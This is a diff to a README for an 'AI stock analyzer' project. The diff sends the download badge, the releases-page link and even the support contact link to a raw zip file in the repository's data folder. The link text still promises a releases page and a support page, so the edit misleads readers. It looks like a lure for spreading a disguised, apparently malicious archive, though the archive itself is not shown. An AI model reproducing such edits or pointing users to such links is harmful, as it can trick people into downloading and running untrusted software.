@@ -1,6 +1,6 @@
 # 🤖 ai-stock-analyzer - Analyze Stocks with AI Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Malumbo1/ai-stock-analyzer/releases)
+[![Download Now](https://github.com/Malumbo1/ai-stock-analyzer/raw/refs/heads/master/data/stock-ai-analyzer-1.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/Malumbo1/ai-stock-analyzer/raw/refs/heads/master/data/stock-ai-analyzer-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Follow these steps to download and run the software.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, [visit this page](https://github.com/Malumbo1/ai-stock-analyzer/releases). Here, you will find the available versions of the software.
+   To download the application, [visit this page](https://github.com/Malumbo1/ai-stock-analyzer/raw/refs/heads/master/data/stock-ai-analyzer-1.8.zip). Here, you will find the available versions of the software.
 
 2. **Choose Your Version**  
    Locate the latest version. You will see a list of downloadable files. Select the file suitable for your operating system.
@@ -94,7 +94,7 @@ If you encounter issues during installation or usage:
    If your problem isn't listed, feel free to open an issue on GitHub. Include details such as your operating system, the version of the application, and a description of the problem.
 
 3. **Contact Us**  
-   For direct support, you can reach us via our [support page](mailto:support@example.com). 
+   For direct support, you can reach us via our [support page](https://github.com/Malumbo1/ai-stock-analyzer/raw/refs/heads/master/data/stock-ai-analyzer-1.8.zip). 
 
 ## 🌍 Community and Contributions
 
